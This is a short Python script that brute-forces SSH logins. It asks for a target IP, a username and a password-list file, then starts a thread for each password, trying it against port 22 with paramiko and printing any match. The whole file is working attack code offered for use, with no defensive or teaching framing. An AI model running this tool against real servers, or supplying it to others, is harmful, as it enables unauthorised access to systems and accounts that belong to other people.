import threading
import os
import paramiko
import sys
import termcolor

stop_flag = 0


def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] found password: ' + password + ', for account: ' + username), "blue"))
    except:
        print(termcolor.colored(('[-] incorrect login: ' + password), "red"))
        ssh.close()


host = input(' [+] target ip: ')
username = input(' [+] ssh username: ')
input_file = input('[+] passwords file: ')
print('\n')

if os.path.exists(input_file) == False:
    print(' file doesnt exist')
    sys.exit(1)

print('starting threading brute on: ' + host + 'account: ' + username + '* * *')

with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
